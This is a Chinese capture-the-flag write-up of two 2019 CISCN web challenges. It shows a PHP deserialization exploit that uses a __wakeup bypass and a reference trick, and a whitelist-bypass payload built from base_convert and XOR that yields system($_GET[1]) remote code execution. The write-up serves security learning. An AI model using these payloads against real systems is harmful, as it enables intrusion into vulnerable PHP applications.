---
title: 第十二届全国大学生信息安全竞赛西北赛区 部分题目 Writeup
tags: 
    - Writeup
    - CTF
    - CISCN
date: 2019/4/22
---

## JustSoso

{% spoiler 题目源码 %}

```php
// index.php
<?php
error_reporting(0);
$file = $_GET["file"];
$payload = $_GET["payload"];
if(!isset($file)){
    echo 'Missing parameter'.'<br>';
}
if(preg_match("/flag/",$file)){
    die('hack attacked!!!');
}
@include($file);
if(isset($payload)){
    $url = parse_url($_SERVER['REQUEST_URI']);
    parse_str($url['query'],$query);
    foreach($query as $value){
        if (preg_match("/flag/",$value)) {
            die('stop hacking!');
            exit();
        }
    }
    $payload = unserialize($payload);
}else{
   echo "Missing parameters";
}
?>
<!--Please test index.php?file=xxx.php -->
<!--Please get the source of hint.php-->
</html>
```

```php
// hint.php
<?php
class Handle{
    private $handle;
    public function __wakeup(){
        foreach(get_object_vars($this) as $k => $v) {
            $this->$k = null;
        }
        echo "Waking up\n";
    }
    public function __construct($handle) {
        $this->handle = $handle;
    }
    public function __destruct(){
        $this->handle->getFlag();
    }
}

class Flag{
    public $file;
    public $token;
    public $token_flag;

    function __construct($file){
        $this->file = $file;
        $this->token_flag = $this->token = md5(rand(1,10000));
    }

    public function getFlag(){
        $this->token_flag = md5(rand(1,10000));
        echo 'asdf';
        if($this->token === $this->token_flag)
        {
            if(isset($this->file)){
                echo @highlight_file($this->file,true);
            }
        }
    }
}
?>
```

{% endspoiler %}

GET参数中含有file, LFI获得index.php源码, 根据其内容继续获得hint.php源码  
发现含有unserialize函数, 联系hint.php内容, 考察点为反序列化

有三处需要绕过:

1. parse_url 三斜杠绕过, 常规
2. `__wakeup` 绕过，[CVE-2016-7124](https://bugs.php.net/bug.php?id=72663)
3. 每次调用getFlag token_flag都会随机变化，可以将token赋值为token_flag 的引用绕过

{% asset_img EUhNFz4.png Source %}

故exploit如下:

```php
<?php
class Flag{}
class Handle{
    private $handle;
    function __construct($xx){
        $this->handle = $xx;
    }
}

$p = new Flag("flag.php");
$p->token = &$p->token_flag;
$p->file = "flag.php";
$pay = new Handle($p);
echo urlencode(serialize($pay));
```

## love the math

{% spoiler 题目源码 %}

```php
// calc.php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    eval('echo '.$content.';');
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

{% endspoiler %}

观察发现如下限制:

1. payload长度不可超过80
1. 可以执行任何数学函数
1. 有部分字符不可用( `$blacklist` )

由于80这个长度太短, 所以后期应当是通过取其它位置的可控输入点进行执行和输出
应当取能够返回字符串的数学函数, 加以拼接得到期望值
题目过滤了所有除数学函数名意外的英文字符, 所以应当利用纯数字构造payload

观察数学函数的输入输出, 发现涉及到不同进制的数学函数能够返回字符串。  
其中利用base_convert能获取更大的字符集, 但也更长  
原型：`base_convert(number,frombase,tobase)`
可以将字符串转为10进制或其它能够组成纯数字的进制来控制输入

验证: `url:/calc.php?c=base_convert(55490343972,10,36)()`
可以执行phpinfo  

比赛时受师傅的引导，将echo file_get_contents缩短为readfile，成功获得了flag

{% asset_img SlwlDOA.png meme %}

其实应该是可以RCE的

> php > `echo base_convert('system', 36, 10);`
> 1751504350

考虑到进制转换只能转出小写字母, 此处利用php能将字符串互相异或的行为, 能够将多个16进制串进行异或得到大写字母。  
于是目的是：将两个`[a-z0-9]*`字符串异或得到`_GET`,利用`_GET{param}`获取到另一参数中引入的更长字串  
进行fuzz, fuzz代码:

```php
$table = "0123456789abcdefghijklmnopqrstuvwxyz";
for($i = 0; $i < 36; $i++){
    for($j = $i; $j < 36; $j++){
        echo $table[$i]^$table[$j];
        echo " ";
        echo $table[$i]." ".$table[$j];
        echo "\n";
    }
}
// php test.php| strings | grep "_"
// php test.php| strings | grep "G"
// php test.php| strings | grep "E"
// php test.php| strings | grep "T"
```

得到`"1000"^"nwud" == "_GET"`
所以能够构造出一句话payload:
`base_convert(1751504350,28,10)(${decoct(512)^base_convert(862402,10,33)}{1})`  
即`system($_GET[1])`
